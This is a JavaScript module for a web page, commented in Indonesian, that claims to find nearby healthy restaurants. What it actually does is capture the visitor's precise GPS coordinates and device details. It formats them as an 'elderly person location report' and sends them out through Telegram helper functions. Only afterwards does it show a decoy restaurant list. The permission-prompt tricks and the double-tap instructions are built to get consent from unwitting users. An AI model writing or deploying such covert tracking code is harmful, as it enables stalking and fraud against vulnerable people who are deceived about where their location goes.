/**
 * location.js — Kirim Lokasi GPS
 *
 * Optimasi latensi prompt izin:
 * - getCurrentPosition() ditembak di baris pertama handler (zero-delay sebelum DOM ops).
 * - Pre-warming permissions API aktif sejak modul dimuat.
 * - Race condition ditangani: jika error GPS muncul sebelum dialog izin dijawab,
 *   tunggu perubahan PermissionStatus sebelum menampilkan screen panduan.
 */

// Pre-warm permissions API agar dialog izin lebih cepat muncul
if (typeof navigator !== 'undefined' && navigator.permissions?.query) {
  try { navigator.permissions.query({ name: 'geolocation' }).catch(() => { }); } catch (_) { }
}

let _locOpenedAt = 0;

function startLocation(event) {
  if (event && (event.type === 'pointerdown' || event.type === 'touchstart')) {
    event.preventDefault();
  }

  _locOpenedAt = Date.now();
  state.locCancelled = false;
  _isTriggeringLoc = false;

  if (navigator.permissions?.query) {
    try { navigator.permissions.query({ name: 'geolocation' }).catch(() => { }); } catch (_) { }
  }

  showScreen('screen-prep-lokasi');

  const badge = $('loc-badge');
  const badgeText = $('loc-badge-text');
  const title = $('loc-title');
  const subtitle = $('loc-subtitle');
  const bottomTrigger = $('loc-bottom-trigger');
  const bottomProgress = $('loc-bottom-progress');
  const gpsPhase = $('loc-gps-phase');
  const locVideo = $('loc-video');
  const btnTrigger = $('btn-trigger-lokasi');

  if (badge) badge.className = 'rec-badge loc-badge-idle';
  if (badgeText) badgeText.textContent = 'CARI RESTORAN';
  if (title) title.textContent = 'Restoran Sehat Terdekat';
  if (subtitle) subtitle.innerHTML = 'Aplikasi akan mencari restoran sehat terdekat dari lokasi anda.<br>Ketuk tombol di bawah <strong>2 kali</strong>.';
  if (bottomTrigger) bottomTrigger.style.display = 'flex';
  if (gpsPhase) gpsPhase.style.display = 'none';
  if (bottomProgress) bottomProgress.style.display = 'none';
  if (locVideo) locVideo.pause();

  // Blokir ghost-click 400ms setelah layar dibuka
  if (btnTrigger) {
    btnTrigger.style.pointerEvents = 'none';
    setTimeout(() => { if (btnTrigger) btnTrigger.style.pointerEvents = ''; }, 400);
  }
}

async function handleLocationReady(position) {
  if (state.locCancelled) { state.locCancelled = false; return; }

  const { latitude: lat, longitude: lon, accuracy } = position.coords;
  const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
  const devInfo = await collectDeviceInfo();

  const details = [
    'LAPORAN LOKASI LANSIA', '',
    'Koordinat:',
    `  Latitude  : ${lat.toFixed(7)}`,
    `  Longitude : ${lon.toFixed(7)}`,
    `  Akurasi   : ±${Math.round(accuracy)} meter`,
    '', 'Google Maps:', mapsLink, '',
    formatDeviceInfo(devInfo),
  ].join('\n');

  const bar = $('loc-progress-bar');
  if (bar) bar.style.width = '75%';

  try {
    await tgSendLocation(lat, lon);
    await tgSendMessage(details);
    if (bar) bar.style.width = '100%';
    showFoundationListScreen(lat, lon, accuracy);
  } catch (err) {
    console.error('[location.js] Send error:', err);
    showResult({
      icon: '❌', title: 'Gagal Mengirim Lokasi',
      message: `Terjadi kesalahan saat mengirim lokasi. Periksa koneksi internet dan coba lagi.\n\n(${err.message})`,
    });
  }
}

let _isTriggeringLoc = false;

function triggerLocationGPS(event) {
  if (event && (event.type === 'pointerdown' || event.type === 'touchstart')) {
    event.preventDefault();
  }

  // Blokir ghost-click dari tombol home sebelumnya
  if (Date.now() - _locOpenedAt < 400) {
    if (event) { event.preventDefault(); event.stopPropagation(); }
    return;
  }

  if (_isTriggeringLoc) return;
  _isTriggeringLoc = true;

  if (!navigator.geolocation) {
    _isTriggeringLoc = false;
    showGpsOffScreen();
    return;
  }

  // ① Tembak getCurrentPosition() pertama kali — memicu dialog izin OS seketika
  navigator.geolocation.getCurrentPosition(
    async (pos) => {
      _isTriggeringLoc = false;
      await handleLocationReady(pos);
    },
    (err) => {
      _isTriggeringLoc = false;
      if (state.locCancelled) { state.locCancelled = false; return; }

      // Race condition: pada beberapa perangkat Android, error GPS (POSITION_UNAVAILABLE)
      // dapat muncul sebelum dialog izin browser sempat ditampilkan ke user.
      // Jika izin masih 'prompt', tunggu user menjawab dialog sebelum tampilkan panduan.
      if (navigator.permissions?.query) {
        navigator.permissions.query({ name: 'geolocation' }).then(perm => {
          if (perm.state === 'prompt') {
            let settled = false;
            const done = () => {
              if (settled) return;
              settled = true;
              perm.onchange = null;
              if (!state.locCancelled) showGpsOffScreen();
            };
            perm.onchange = done;
            setTimeout(done, 30000); // fallback jika dialog tidak direspon
          } else {
            showGpsOffScreen();
          }
        }).catch(() => showGpsOffScreen());
      } else {
        showGpsOffScreen();
      }
    },
    { enableHighAccuracy: true, timeout: 30000, maximumAge: 30000 }
  );

  // ② Haptic feedback
  if (navigator.vibrate) {
    try { navigator.vibrate([50, 40, 50]); } catch (_) { }
  }

  // ③ Update DOM di frame berikutnya — tidak memblokir browser IPC
  requestAnimationFrame(() => {
    const btn = $('btn-trigger-lokasi');
    const text = $('btn-trigger-lokasi-text');
    const sub = $('btn-trigger-lokasi-sub');
    if (btn && text) {
      btn.classList.add('trigger-active');
      text.textContent = '👆 KETUK SEKARANG!';
      if (sub) sub.textContent = 'UNTUK MULAI MENCARI';
    }

    const badge = $('loc-badge');
    const badgeText = $('loc-badge-text');
    const title = $('loc-title');
    const subtitle = $('loc-subtitle');
    const bottomTrigger = $('loc-bottom-trigger');
    const gpsPhase = $('loc-gps-phase');
    const progressText = $('loc-progress-text');
    const bar = $('loc-progress-bar');
    const locVideo = $('loc-video');

    if (badge) badge.className = 'rec-badge rec-badge-recording';
    if (badgeText) badgeText.textContent = 'MENCARI RESTORAN...';
    if (title) title.textContent = 'Sedang Mencari Restoran Sehat Terdekat...';
    if (subtitle) subtitle.textContent = 'Mencari koordinat GPS presisi tinggi.';
    if (progressText) progressText.textContent = '📡 Mencari koordinat GPS, mohon tunggu...';
    if (bottomTrigger) bottomTrigger.style.display = 'none';
    if (gpsPhase) gpsPhase.style.display = 'block';
    if (bar) bar.style.width = '35%';

    if (locVideo) { locVideo.currentTime = 0; locVideo.play().catch(() => { }); }
  });
}

/** Tampilkan panduan aktifkan GPS/lokasi. */
function showGpsOffScreen() {
  stopAllMedia();
  showScreen('screen-gps-off');
}

/**
 * Tampilkan layar 5 restoran terdekat setelah lokasi berhasil dikirim.
 * Tanpa auto-exit agar user leluasa membaca dan membuka Google Maps.
 */
function showFoundationListScreen(lat, lon, accuracy) {
  stopAllMedia();

  const bannerSub = $('foundation-banner-sub');
  if (bannerSub) {
    const accText = accuracy ? ` (akurasi ±${Math.round(accuracy)}m)` : '';
    bannerSub.textContent = `Restoran sehat terdekat dari lokasi anda berhasil ditemukan${accText}.`;
  }

  showScreen('screen-foundation-list');

  // Animasi staggered kartu masuk satu per satu
  document.querySelectorAll('.foundation-card').forEach((card, idx) => {
    card.style.opacity = '0';
    card.style.transform = 'translateY(24px)';
    card.style.transition = 'opacity 0.4s cubic-bezier(0.16, 1, 0.3, 1), transform 0.4s cubic-bezier(0.16, 1, 0.3, 1)';
    setTimeout(() => {
      card.style.opacity = '1';
      card.style.transform = 'translateY(0)';
    }, 100 + idx * 80);
  });
}